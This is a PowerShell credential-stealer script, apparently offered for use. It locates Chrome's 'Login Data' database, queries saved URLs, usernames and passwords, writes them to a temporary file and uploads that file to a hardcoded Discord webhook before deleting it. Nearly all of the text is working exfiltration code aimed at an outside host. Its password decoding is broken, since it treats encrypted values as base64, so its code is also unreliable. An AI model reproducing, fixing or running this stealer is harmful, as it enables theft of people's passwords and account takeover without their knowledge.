# Define the Discord Webhook URL
$webhook = "https://discord.com/api/webhooks/1315398167768076348/FHFvfm3hhnJDsTNvuTR-5oB86OJY7kUwI-4F5S_Hxn7SdgZY1gXxaRQFuMO-yFFwPnPT"

# Function for sending messages through Discord Webhook
function Send-DiscordMessage {
    param (
        [string]$message
    )

    $body = @{
        content = $message
    }

    try {
        Invoke-RestMethod -Uri $webhook -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
    } catch {
        Write-Host "Failed to send message to Discord: $_"
    }
}

# Function to extract passwords from Chrome Login Data (SQLite database)
function Extract-Passwords {
    param (
        [string]$chromeLoginDataPath,
        [string]$outputFilePath
    )

    # Ensure the SQLite module is available
    if (-not (Get-Command 'sqlite3' -ErrorAction SilentlyContinue)) {
        Write-Host "SQLite3 command is not available. Please install it."
        return
    }

    # Define the SQLite query to extract login data (usernames and passwords)
    $query = "SELECT origin_url, action_url, username_value, password_value FROM logins;"

    # Read the Login Data database using SQLite3 command-line tool
    $cmd = "sqlite3 $chromeLoginDataPath '$query'"
    $output = & $cmd

    if ($output) {
        # Convert the output into a clean format
        $passwordsText = "Chrome Passwords Extracted:`r`n"
        foreach ($line in $output.Split("`r`n")) {
            if ($line -match "(.+)\|(.+)\|(.+)\|(.+)") {
                $url = $matches[1]
                $username = $matches[2]
                $password = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($matches[4]))

                # Write the extracted data to the output file
                $passwordsText += "URL: $url`r`nUsername: $username`r`nPassword: $password`r`n`r`n"
            }
        }

        # Save the passwords to a .txt file
        $passwordsText | Out-File -FilePath $outputFilePath
        Write-Host "Passwords saved to: $outputFilePath"
    } else {
        Write-Host "No passwords found or error extracting data."
    }
}

# Function for uploading files to Discord via webhook
function Upload-FileToDiscord {
    param (
        [string]$filePath
    )

    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
    $fileName = [System.IO.Path]::GetFileName($filePath)

    $boundary = "----WebKitFormBoundary" + [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"
    $bodyLines = (
        "--$boundary",
        "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
        "Content-Type: application/octet-stream",
        $LF,
        [System.Text.Encoding]::ASCII.GetString($fileBytes),
        "--$boundary--",
        $LF
    ) -join $LF

    $headers = @{
        "Content-Type" = "multipart/form-data; boundary=$boundary"
    }

    try {
        # Send the file to Discord via webhook
        $response = Invoke-RestMethod -Uri $webhook -Method Post -Body $bodyLines -Headers $headers
        Write-Host "File uploaded successfully."
    } catch {
        Write-Host "Failed to upload file to Discord: $_"
    }
}

# Check for Chrome executable and user data
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$loginDataPath = "$chromePath\Default\Login Data"
if (-not (Test-Path $loginDataPath)) {
    Send-DiscordMessage -message "Chrome Login Data not found!"
    exit
}

# Define the output path for the password file
$outputFile = "$env:TEMP\chrome_passwords.txt"

# Extract passwords from Chrome's Login Data
Extract-Passwords -chromeLoginDataPath $loginDataPath -outputFilePath $outputFile

# Upload the .txt file containing passwords to Discord
Upload-FileToDiscord -filePath $outputFile

# Optionally, remove the .txt file after uploading
Remove-Item $outputFile
